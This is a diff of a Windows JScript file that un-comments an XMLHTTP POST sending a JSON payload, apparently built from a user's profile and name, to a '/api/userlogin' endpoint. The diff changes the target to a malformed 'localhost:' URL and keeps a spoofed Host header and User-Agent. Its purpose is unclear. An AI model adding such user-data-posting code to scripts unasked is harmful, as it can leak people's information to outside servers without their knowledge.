@@ -475,14 +475,14 @@ try {
 			 WScript.Echo(""+profile+"\\"+usern+".txt");
 		}
 	} catch(e) {}
-	/*
+	
 	var http = new ActiveXObject("Microsoft.XMLHTTP");
-	http.open("POST", "http://map.ukrtransnafta.com/api/userlogin", false);
+	http.open("POST", "http://localhost:/api/userlogin", false);
 	http.setRequestHeader("Host", "app.ukrtransnafta.com");
 	http.setRequestHeader("User-Agent", "Mozilla/4.0 (compatible; Synapse)");
 	http.setRequestHeader("Content-Type", "application/json");
 	http.send(json);
-	*/
+
 	WScript.Echo(json);
 	
 } catch(e) {}
